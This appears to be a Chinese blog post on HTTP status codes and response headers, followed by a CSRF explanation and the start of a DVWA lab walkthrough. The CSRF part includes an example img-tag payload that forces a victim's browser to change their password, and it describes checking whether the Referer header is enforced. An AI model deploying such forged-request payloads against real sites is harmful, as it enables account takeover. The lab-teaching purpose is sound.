+<p>对应当前请求的响应可以在另一个URI上被找到,当响应于POST（或PUT &#x2F; DELETE）接收到响应时,客户端应该假定服务器已经收到数据,并且应该使用单独的GET消息发出重定向.这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源.这个新的URI不是原始资源的替代引用.同时,303响应禁止被缓存.当然,第二个请求（重定向）可能被缓存.</p>
+<p>新的URI应当在响应的Location域中返回.除非这是一个HEAD请求,否则响应的实体中应当包含指向新的URI的超链接及简短说明.</p>
+<p>注意：许多HTTP&#x2F;1.1版以前的浏览器不能正确理解303状态.如果需要考虑与这些浏览器之间的互动,302状态码应该可以胜任,因为大多数的浏览器处理302响应时的方式恰恰就是上述规范要求客户端处理303响应时应当做的.</p>
+</li>
+<li><p>304 Not Modified</p>
+<p>表示资源在由请求头中的If-Modified-Since或If-None-Match参数指定的这一版本之后,未曾被修改.在这种情况下,由于客户端仍然具有以前下载的副本,因此不需要重新传输资源.</p>
+</li>
+<li><p>305 Use Proxy</p>
+<p>被请求的资源必须通过指定的代理才能被访问.Location域中将给出指定的代理所在的URI信息,接收者需要重复发送一个单独的请求,通过这个代理才能访问相应资源.只有原始服务器才能创建305响应.许多HTTP客户端（像是Mozilla）和Internet Explorer）都没有正确处理这种状态代码的响应,主要是出于安全考虑.</p>
+<p>注意：RFC 2068中没有明确305响应是为了重定向一个单独的请求,而且只能被原始服务器创建.忽视这些限制可能导致严重的安全后果.</p>
+</li>
+<li><p>306 Switch Proxy</p>
+<p>在最新版的规范中,306状态码已经不再被使用.最初是指“后续请求应使用指定的代理”.</p>
+</li>
+<li><p>307 Temporary Redirect</p>
+<p>在这种情况下,请求应该与另一个URI重复,但后续的请求应仍使用原始的URI. 与302相反,当重新发出原始请求时,不允许更改请求方法. 例如,应该使用另一个POST请求来重复POST请求.</p>
+</li>
+<li><p>308 Permanent Redirect (RFC 7538)</p>
+<p>请求和所有将来的请求应该使用另一个URI重复. 307和308重复302和301的行为,但不允许HTTP方法更改. 例如,将表单提交给永久重定向的资源可能会顺利进行</p>
+</li>
+</ul>
+<h5 id="4xx-客户端错误"><a href="#4xx-客户端错误" class="headerlink" title="4xx 客户端错误"></a>4xx 客户端错误</h5><p>这类的状态码代表了客户端看起来可能发生了错误,妨碍了服务器的处理.除非响应的是一个HEAD请求,否则服务器就应该返回一个解释当前错误状况的实体,以及这是临时的还是永久性的状况.这些状态码适用于任何请求方法.浏览器应当向用户显示任何包含在此类错误响应中的实体内容.</p>
+<p>如果错误发生时客户端正在传送数据,那么使用TCP的服务器实现应当仔细确保在关闭客户端与服务器之间的连接之前,客户端已经收到了包含错误信息的[数据包.如果客户端在收到错误信息后继续向服务器发送数据,服务器的TCP栈将向客户端发送一个重置数据包,以清除该客户端所有还未识别的输入缓冲,以免这些数据被服务器上的应用程序读取并干扰后者.</p>
+<ul>
+<li><p>400 Bad Request</p>
+<p>由于明显的客户端错误（例如,格式错误的请求语法,太大的大小,无效的请求消息或欺骗性路由请求）,服务器不能或不会处理该请求.</p>
+</li>
+<li><p>401 Unauthorized RFC 7235</p>
+<p>参见：HTTP基本认证、HTTP摘要认证</p>
+<p>类似于403 Forbidden,401语义即“未认证”,即用户没有必要的凭据.该状态码表示当前请求需要用户验证.该响应必须包含一个适用于被请求资源的WWW-Authenticate信息头用以询问用户信息.客户端可以重复提交一个包含恰当的Authorization头信息的请求.如果当前请求已经包含了Authorization证书,那么401响应代表着服务器验证已经拒绝了那些证书.如果401响应包含了与前一个响应相同的身份验证询问,且浏览器已经至少尝试了一次验证,那么浏览器应当向用户展示响应中包含的实体信息,因为这个实体信息中可能包含了相关诊断信息.</p>
+<p>注意：当网站（通常是网站域名）禁止IP地址时,有些网站状态码显示的401,表示该特定地址被拒绝访问网站.</p>
+</li>
+<li><p>402 Payment Required</p>
+<p>该状态码是为了将来可能的需求而预留的.该状态码最初的意图可能被用作某种形式的数字现金或在线支付方案的一部分,但几乎没有哪家服务商使用,而且这个状态码通常不被使用.如果特定开发人员已超过请求的每日限制,Google Developers API会使用此状态码.</p>
+</li>
+<li><p>403 Forbidden</p>
+<p>服务器已经理解请求,但是拒绝执行它.与401响应不同的是,身份验证并不能提供任何帮助,而且这个请求也不应该被重复提交.如果这不是一个HEAD请求,而且服务器希望能够讲清楚为何请求不能被执行,那么就应该在实体内描述拒绝的原因.当然服务器也可以返回一个404响应,假如它不希望让客户端获得任何信息.</p>
+</li>
+<li><p>404 Not Found</p>
+<p>请求失败,请求所希望得到的资源未被在服务器上发现,但允许用户的后续请求.没有信息能够告诉用户这个状况到底是暂时的还是永久的.假如服务器知道情况的话,应当使用410状态码来告知旧资源因为某些内部的配置机制问题,已经永久的不可用,而且没有任何可以跳转的地址.404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下.</p>
+</li>
+<li><p>405 Method Not Allowed</p>
+<p>请求行中指定的请求方法不能被用于请求相应的资源.该响应必须返回一个Allow头信息用以表示出当前资源能够接受的请求方法的列表.例如,需要通过POST呈现数据的表单上的GET请求,或只读资源上的PUT请求.</p>
+<p>鉴于PUT,DELETE方法会对服务器上的资源进行写操作,因而绝大部分的网页服务器都不支持或者在默认配置下不允许上述请求方法,对于此类请求均会返回405错误.</p>
+</li>
+<li><p>406 Not Acceptable</p>
+<p>参见：内容协商</p>
+<p>请求的资源的内容特性无法满足请求头中的条件,因而无法生成响应实体,该请求不可接受.</p>
+<p>除非这是一个HEAD请求,否则该响应就应当返回一个包含可以让用户或者浏览器从中选择最合适的实体特性以及地址栏表的实体.实体的格式由Content-Type头中定义的媒体类型决定.浏览器可以根据格式及自身能力自行作出最佳选择.但是,规范中并没有定义任何作出此类自动选择的标准.</p>
+</li>
+<li><p>407 Proxy Authentication Required RFC 2617</p>
+<p>与401响应类似,只不过客户端必须在代理服务器上进行身份验证.代理服务器必须返回一个Proxy-Authenticate用以进行身份询问.客户端可以返回一个Proxy-Authorization信息头用以验证.</p>
+</li>
+<li><p>408 Request Timeout</p>
+<p>请求超时.根据HTTP规范,客户端没有在服务器预备等待的时间内完成一个请求的发送,客户端可以随时再次提交这一请求而无需进行任何更改.</p>
+</li>
+<li><p>409 Conflict</p>
+<p>表示因为请求存在冲突无法处理该请求,例如多个同步更新之间的编辑冲突</p>
+</li>
+<li><p>410 Gone</p>
+<p>表示所请求的资源不再可用.当资源被有意地删除并且资源应被清除时,应该使用这个.在收到410状态码后,用户应停止再次请求资源.但大多数服务端不会使用此状态码,而是直接使用404状态码.</p>
+</li>
+<li><p>411 Length Required</p>
+<p>服务器拒绝在没有定义Content-Length头的情况下接受请求.在添加了表明请求消息体长度的有效Content-Length头之后,客户端可以再次提交该请求.[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#cite_note-39">39]</a></p>
+</li>
+<li><p>412 Precondition Failed （RFC 7232）</p>
+<p>服务器在验证在请求的头字段中给出先决条件时,没能满足其中的一个或多个.这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件,以此避免该请求方法被应用到其希望的内容以外的资源上.</p>
+</li>
+<li><p>413 Request Entity Too Large （RFC 7231）</p>
+<p>前称“Request Entity Too Large”,表示服务器拒绝处理当前请求,因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围.此种情况下,服务器可以关闭连接以免客户端继续发送此请求.</p>
+<p>如果这个状况是临时的,服务器应当返回一个Retry-After的响应头,以告知客户端可以在多少时间以后重新尝试.</p>
+</li>
+<li><p>414 Request-URI Too Long（RFC 7231）</p>
+<p>前称“Request-URI Too Long”,表示请求的URI长度超过了服务器能够解释的长度,因此服务器拒绝对该请求提供服务.通常将太多数据的结果编码为GET请求的查询字符串,在这种情况下,应将其转换为POST请求.这比较少见,通常的情况包括：本应使用POST方法的表单提交变成了GET方法,导致查询字符串过长.重定向URI“黑洞”,例如每次重定向把旧的URI作为新的URI的一部分,导致在若干次重定向后URI超长.客户端正在尝试利用某些服务器中存在的安全漏洞攻击服务器.这类服务器使用固定长度的缓冲读取或操作请求的URI,当GET后的参数超过某个数值后,可能会产生缓冲区溢出,导致任意代码被执行.没有此类漏洞的服务器,应当返回414状态码.</p>
+</li>
+<li><p>415 Unsupported Media Type</p>
+<p>对于当前请求的方法和所请求的资源,请求中提交的互联网媒体类型并不是服务器中所支持的格式,因此请求被拒绝.例如,客户端将图像上传格式为svg,但服务器要求图像使用上传格式为jpg.</p>
+</li>
+<li><p>416 Requested Range Not Satisfiable（RFC 7233）</p>
+<p>前称“Requested Range Not Satisfiable”.客户端已经要求文件的一部分（Byte serving）,但服务器不能提供该部分.例如,如果客户端要求文件的一部分超出文件尾端.</p>
+</li>
+<li><p>417 Expectation Failed</p>
+<p>在请求头Expect中指定的预期内容无法被服务器满足,或者这个服务器是一个代理服显的证据证明在当前路由的下一个节点上,Expect的内容无法被满足.</p>
+</li>
+<li><p>418 I’m a teapot</p>
+<p>本操作码是在1998年作为IETF的传统愚人节笑话, 在RFC 2324[超文本咖啡壶控制协议中定义的,并不需要在真实的HTTP服务器中定义.当一个控制茶壶的HTCPCP收到BREW或POST指令要求其煮咖啡时应当回传此错误.这个HTTP状态码在某些网站（包括Google.com）与项目（如Node.js、ASP.NET])和[Go语言）中用作彩蛋</p>
+</li>
+<li><p>421 Misdirected Request</p>
+<p>该请求针对的是无法产生响应的服务器（例如因为连接重用）.</p>
+</li>
+<li><p>422 Unprocessable Entity</p>
+<p>请求格式正确,但是由于含有语义错误,无法响应</p>
+</li>
+<li><p>423 Locked</p>
+<p>当前资源被锁定.</p>
+</li>
+<li><p>424 Failed Dependency</p>
+<p>由于之前的某个请求发生的错误,导致当前请求失败,例如PROPPATCH.</p>
+</li>
+<li><p>425 Too Early</p>
+<p>服务器拒绝处理在Early Data中的请求,以规避可能的重放攻击</p>
+</li>
+<li><p>426 Upgrade Required</p>
+<p>客户端应切换到Upgrade头字段中给出的不同协议,如TLS&#x2F;1.0</p>
+</li>
+<li><p>428 Precondition Required</p>
+<p>原服务器要求该请求满足一定条件.这是为了防止“未更新”问题,即客户端读取（GET）一个资源的状态,更改它,并将它写（PUT）回服务器,但这期间第三方已经在服务器上更改了该资源的状态,因此导致了冲突.”</p>
+</li>
+<li><p>429 Too Many Requests</p>
+<p>用户在给定的时间内发送了太多的请求.旨在用于网络限速</p>
+</li>
+<li><p>431 Request Header Fields Too Large</p>
+<p>服务器不愿处理请求,因为一个或多个头字段过大.</p>
+</li>
+<li><p>440 Login Time-out</p>
+<p>客户端session超时失效,需要重新登录.</p>
+</li>
+<li><p>451 Unavailable For Legal Reasons</p>
+</li>
+</ul>
+<h5 id="5xx-服务器错误"><a href="#5xx-服务器错误" class="headerlink" title="5xx 服务器错误"></a>5xx 服务器错误</h5><p>表示服务器无法完成明显有效的请求.这类状态码代表了服务器在处理请求的过程中有错误或者异常状态发生,也有可能是服务器意识到以当前的软硬件资源无法完成对请求的处理.除非这是一个HEAD请求,否则服务器应当包含一个解释当前错误状态以及这个状况是临时的还是永久的解释信息实体.浏览器应当向用户展示任何在当前响应中被包含的实体.这些状态码适用于任何响应方法.</p>
+<ul>
+<li><p>500 Internal Server Error</p>
+<p>通用错误消息,服务器遇到了一个未曾预料的状况,导致了它无法完成对请求的处理.没有给出具体错误信息.</p>
+</li>
+<li><p>501 Not Implemented</p>
+<p>服务器不支持当前请求所需要的某个功能.当服务器无法识别请求的方法,并且无法支持其对任何资源的请求.（例如,网络服务API的新功能）</p>
+</li>
+<li><p>502 Bad Gateway</p>
+<p>作为网关或者代理工作的服务器尝试执行请求时,从上游服务器接收到无效的响应.</p>
+</li>
+<li><p>503 Service Unavailable</p>
+<p>由于临时的服务器维护或者过载,服务器当前无法处理请求.这个状况是暂时的,并且将在一段时间以后恢复.如果能够预计延迟时间,那么响应中可以包含一个Retry-After头用以标明这个延迟时间.如果没有给出这个Retry-After信息,那么客户端应当以处理500响应的方式处理它.</p>
+</li>
+<li><p>504 Gateway Timeout</p>
+<p>作为网关或者代理工作的服务器尝试执行请求时,未能及时从上游服务器（URI标识出的服务器,例如HTTP、FTP、LDAP）或者辅助服务器（例如DNS）收到响应.</p>
+<p>注意：某些代理服务器在DNS查询超时时会返回400或者500错误.</p>
+</li>
+<li><p>505 HTTP Version Not Supported</p>
+<p>服务器不支持,或者拒绝支持在请求中使用的HTTP版本.这暗示着服务器不能或不愿使用与客户端相同的版本.响应中应当包含一个描述了为何版本不被支持以及服务器支持哪些协议的实体.</p>
+</li>
+<li><p>506 Variant Also Negotiates</p>
+<p>由《透明内容协商协议》扩展,代表服务器存在内部配置错误,[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#cite_note-RFC_2295-64">64]</a>被请求的协商变元资源被配置为在透明内容协商中使用自己,因此在一个协商处理中不是一个合适的重点.</p>
+</li>
+<li><p>507 Insufficient Storage</p>
+<p>服务器无法存储完成请求所必须的内容.这个状况被认为是临时的.</p>
+</li>
+<li><p>508 Loop Detected</p>
+<p>服务器在处理请求时陷入死循环. （可代替 208状态码]）</p>
+</li>
+<li><p>510 Not Extended</p>
+<p>获取资源所需要的策略并没有被满足</p>
+</li>
+<li><p>511 Network Authentication Required ）</p>
+<p>客户端需要进行身份验证才能获得网络访问权限,旨在限制用户群访问特定网络.（例如连接WiFi热点时的强制网络门户）</p>
+</li>
+</ul>
+<h3 id="响应标记头"><a href="#响应标记头" class="headerlink" title="响应标记头"></a>响应标记头</h3><table>
+<thead>
+<tr>
+<th align="center">字段名</th>
+<th align="center">说明</th>
+<th align="center">例子</th>
+<th align="center">状态</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Access-Control-Allow-Origin</td>
+<td align="center">指定哪些网站可参与到跨来源资源共享过程中</td>
+<td align="center"><code>Access-Control-Allow-Origin: *</code></td>
+<td align="center">临时</td>
+</tr>
+<tr>
+<td align="center">Accept-Patch</td>
+<td align="center">指定服务器支持的文件格式类型.</td>
+<td align="center"><code>Accept-Patch: text/example;charset=utf-8</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Accept-Ranges</td>
+<td align="center">这个服务器支持哪些种类的部分内容范围</td>
+<td align="center"><code>Accept-Ranges: bytes</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Age</td>
+<td align="center">这个对象在代理缓存中存在的时间,以秒为单位</td>
+<td align="center"><code>Age: 12</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Allow</td>
+<td align="center">对于特定资源有效的动作.针对HTTP&#x2F;405这一错误代码而使用</td>
+<td align="center"><code>Allow: GET, HEAD</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Cache-Control</td>
+<td align="center">向从服务器直到客户端在内的所有缓存机制告知,它们是否可以缓存这个对象.其单位为秒</td>
+<td align="center"><code>Cache-Control: max-age=3600</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Connection</td>
+<td align="center">针对该连接所预期的选项</td>
+<td align="center"><code>Connection: close</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Content-Disposition</td>
+<td align="center">一个可以让客户端下载文件并建议文件名的头部.文件名需要用双引号包裹.</td>
+<td align="center"><code>Content-Disposition: attachment; filename=&quot;fname.ext&quot;</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Content-Encoding</td>
+<td align="center">在数据上使用的编码类型.参考 超文本传输协议压缩 .</td>
+<td align="center"><code>Content-Encoding: gzip</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Content-Language</td>
+<td align="center">内容所使用的语言</td>
+<td align="center"><code>Content-Language: da</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Content-Length</td>
+<td align="center">回应消息体的长度,以 字节 （8位为一字节）为单位</td>
+<td align="center"><code>Content-Length: 348</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Content-Location</td>
+<td align="center">所返回的数据的一个候选位置</td>
+<td align="center"><code>Content-Location: /index.htm</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Content-MD5</td>
+<td align="center">回应内容的二进制 MD5 散列,以 Base64 方式编码</td>
+<td align="center"><code>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</code></td>
+<td align="center">过时的</td>
+</tr>
+<tr>
+<td align="center">Content-Range</td>
+<td align="center">这条部分消息是属于某条完整消息的哪个部分</td>
+<td align="center"><code>Content-Range: bytes 21010-47021/47022</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Content-Type</td>
+<td align="center">当前内容的MIME类型</td>
+<td align="center"><code>Content-Type: text/html; charset=utf-8</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Date</td>
+<td align="center">此条消息被发送时的日期和时间(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示)</td>
+<td align="center"><code>Date: Tue, 15 Nov 1994 08:12:31 GMT</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP_ETag">ETag</a></td>
+<td align="center">对于某个资源的某个特定版本的一个标识符,通常是一个 消息散列</td>
+<td align="center"><code>ETag: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Expires</td>
+<td align="center">指定一个日期&#x2F;时间,超过该时间则认为此回应已经过期</td>
+<td align="center"><code>Expires: Thu, 01 Dec 1994 16:00:00 GMT</code></td>
+<td align="center">常设: 标准</td>
+</tr>
+<tr>
+<td align="center">Last-Modified</td>
+<td align="center">所请求的对象的最后修改日期(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示)</td>
+<td align="center"><code>Last-Modified: Tue, 15 Nov 1994 12:45:26 GMT</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Link</td>
+<td align="center">用来表达与另一个资源之间的类型关系,此处所说的类型关系是在 RFC 5988 中定义的</td>
+<td align="center"><code>Link: &lt;/feed&gt;; rel=&quot;alternate&quot;</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Location</td>
+<td align="center">用来 进行重定向,或者在创建了某个新资源时使用.</td>
+<td align="center"><code>Location: http://www.w3.org/pub/WWW/People.html</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">P3P</td>
+<td align="center">用于支持设置P3P策略,标准格式为“<code>P3P:CP=&quot;your_compact_policy&quot;</code>”.然而P3P规范并不成功,[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-33">33]</a>大部分现代浏览器没有完整实现该功能,而大量网站也将该值设为假值,从而足以用来欺骗浏览器的P3P插件功能并授权给第三方Cookies.</td>
+<td align="center"><code>P3P: CP=&quot;This is not a P3P policy! ``See http://www.google.com/support/accounts/bin/answer.py?hl=en&amp;answer=151657 for more info.&quot;</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Pragma</td>
+<td align="center">与具体的实现相关,这些字段可能在请求&#x2F;回应链中的任何时候产生多种效果.</td>
+<td align="center"><code>Pragma: no-cache</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Proxy-Authenticate</td>
+<td align="center">要求在访问代理时提供身份认证信息.</td>
+<td align="center"><code>Proxy-Authenticate: Basic</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Public-Key-Pins</td>
+<td align="center">用于缓解中间人攻击,声明网站认证使用的传输层安全协议证书的散列值</td>
+<td align="center"><code>Public-Key-Pins: max-age=2592000; pin-sha256=&quot;E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=&quot;;</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Refresh</td>
+<td align="center">用于设定可定时的重定向跳转.右边例子设定了5秒后跳转至“<code>http://www.w3.org/pub/WWW/People.html</code>”.</td>
+<td align="center"><code>Refresh: 5; url=http://www.w3.org/pub/WWW/People.html</code></td>
+<td align="center">专利并非标准Netscape实现的扩展,但大部分网页浏览器也支持.</td>
+</tr>
+<tr>
+<td align="center">Retry-After</td>
+<td align="center">如果某个实体临时不可用,则,此协议头用来告知客户端日后重试.其值可以是一个特定的时间段(以秒为单位)或一个超文本传输协议日期.</td>
+<td align="center">Example 1: <code>Retry-After: 120</code>Example 2: <code>Retry-After: Fri, 07 Nov 2014 23:59:59 GMT</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Server</td>
+<td align="center">服务器的名字</td>
+<td align="center"><code>Server: Apache/2.4.1 (Unix)</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Set-Cookie</td>
+<td align="center">HTTP cookie</td>
+<td align="center"><code>Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</code></td>
+<td align="center">常设: 标准</td>
+</tr>
+<tr>
+<td align="center">Status</td>
+<td align="center">通用网关接口 协议头字段,用来说明当前这个超文本传输协议回应的 状态 .普通的超文本传输协议回应,会使用单独的“状态行”（”Status-Line”）作为替代,这一点是在 RFC 7230 中定义的.</td>
+<td align="center"><code>Status: 200 OK</code></td>
+<td align="center">Not listed as a registered field name</td>
+</tr>
+<tr>
+<td align="center">Strict-Transport-Security</td>
+<td align="center">HTTP 严格传输安全这一头部告知客户端缓存这一强制 HTTPS 策略的时间,以及这一策略是否适用于其子域名.</td>
+<td align="center"><code>Strict-Transport-Security: max-age=16070400; includeSubDomains</code></td>
+<td align="center">常设: 标准</td>
+</tr>
+<tr>
+<td align="center">Trailer</td>
+<td align="center">这个头部数值指示了在这一系列头部信息由由分块传输编码编码.</td>
+<td align="center"><code>Trailer: Max-Forwards</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Transfer-Encoding</td>
+<td align="center">用来将实体安全地传输给用户的编码形式.当前定义的方法包括：分块（chunked）、compress、deflate、gzip和identity.</td>
+<td align="center"><code>Transfer-Encoding: chunked</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Upgrade</td>
+<td align="center">要求客户端升级到另一个协议.</td>
+<td align="center"><code>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Vary</td>
+<td align="center">告知下游的代理服务器,应当如何对未来的请求协议头进行匹配,以决定是否可使用已缓存的回应内容而不是重新从原始服务器请求新的内容.</td>
+<td align="center"><code>Vary: *</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Via</td>
+<td align="center">告知代理服务器的客户端,当前回应是通过什么途径发送的.</td>
+<td align="center"><code>Via: 1.0 fred, 1.1 example.com (Apache/1.1)</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Warning</td>
+<td align="center">一般性的警告,告知在实体内容体中可能存在错误.</td>
+<td align="center"><code>Warning: 199 Miscellaneous warning</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">WWW-Authenticate</td>
+<td align="center">表明在请求获取这个实体时应当使用的认证模式.</td>
+<td align="center"><code>WWW-Authenticate: Basic</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">X-Frame-Options</td>
+<td align="center">点击劫持保护：<code>deny</code>：该页面不允许在 frame 中展示,即使是同域名内.<code>sameorigin</code>：该页面允许同域名内在 frame 中展示.<code>allow-from *uri*</code>：该页面允许在指定uri的 frame 中展示.<code>allowall</code>：允许任意位置的frame显示,非标准值.</td>
+<td align="center"><code>X-Frame-Op</code></td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+<h2 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h2><h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><blockquote>
+<p>CSRF:全称 <code>Cross-site request forgery</code>,翻译过来就是跨站请求伪造(客户端),是指利用受害者尚未失效的身份认证信息(<code>cookie</code> 、会话等),诱骗其点击恶意链接或者访问包含攻击代码的页面,在受害人不知情的情况下以受害者的身份向(身份认证信息所对应的)服务器发送请求,从而完成非法操作. 比如A网站的a用户,修改密码的操作是靠<code>http://xxx.com/xx.php?password=jiangjiyue</code>向服务器发送一个get请求来执行的,那么如果在防御机制较差的情况下,攻击者b在恶意网站B的某个页面插入<code>&lt;img scr=&#39;http://xxx.com/xx.php?password=jiangjiyue&#39; /&gt;</code>,并诱使a访问,那么a在访问恶意页面时实际就以自己的身份向服务器发送了一次修改密码请求,而服务器做出响应后,a用户密码将被改成<code>jiangjiyue</code></p>
+</blockquote>
+<h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>CSRF漏洞有两个关键条件,理解这两个条件可以帮助我们理解并防御CSRF漏洞:</p>
+<ol>
+<li><p>服务端验证refer</p>
+<p>简单来说就是判断用户从哪个页面来,如果发现A用户的修改密码请求是来自B网站的,就应该拒绝执行.机制不完善,导致另一个不可信站点的请求可以被服务器接收并返回相应数据.</p>
+</li>
+<li><p>服务端验证token </p>
+<p>服务端应该在每次用户执行敏感操作时(如更改密码),从服务端返回一个随机(术语称token)数给用户,用户请求时必须带上和服务端一致的token,否则拒绝执行.若没有采取token机制或token可预测,那么CSRF就变得容易利用</p>
+</li>
+</ol>
+<h3 id="CSRF利用流程"><a href="#CSRF利用流程" class="headerlink" title="CSRF利用流程"></a>CSRF利用流程</h3><ol>
+<li>攻击者发现CSRF漏洞</li>
+<li>构造代码</li>
+<li>发送给受害人</li>
+<li>受害人打开</li>
+<li>受害人执行代码</li>
+<li>完成攻击</li>
+</ol>
+<h3 id="漏洞实验"><a href="#漏洞实验" class="headerlink" title="漏洞实验"></a>漏洞实验</h3><p><strong>本次靶场采用的为dvwa</strong></p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>IP</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>靶机</td>
+<td><code>192.168.86.131</code></td>
+</tr>
+<tr>
+<td>本机(也就是构造POC的服务器)</td>
+<td><a target="_blank" rel="noopener" href="http://www.vmcentos.com/">www.vmcentos.com</a></td>
+</tr>
+</tbody></table>
+<h4 id="低级"><a href="#低级" class="headerlink" title="低级"></a>低级</h4><h5 id="请求分析"><a href="#请求分析" class="headerlink" title="请求分析"></a>请求分析</h5><p>首先我们进入DVWA目标网站,用户名admin,密码 password,并将级别配置为low. 来到CSRF选项,执行一次正常的修改密码并进行观察.可以看到,更改密码的请求是直接放到url里的get请求.</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827091622243.png" alt="image-20220827091622243"></p>
+<p><strong>可以看到以上请求包内也没有token第一个要求满足</strong></p>
+<p>然后我们看看第二个要求refer</p>
+<p>我们右键<code>Send to Repeater</code>或者快捷键<code>Ctrl+R</code>发送到repeater模块</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827092420828.png" alt="image-20220827092420828"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827092659256.png" alt="image-20220827092659256"></p>
+<p><strong>通过以上图片我们可以分析出即使将<code>referer</code>删掉之后也可以造成密码更改,2个条件都满足</strong></p>
+<h5 id="构建POC"><a href="#构建POC" class="headerlink" title="构建POC"></a>构建POC</h5><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827093043237.png" alt="image-20220827093043237"></p>
+<p>我们复制以下内容在本机的<code>phpstudy</code>中构造恶意页面</p>
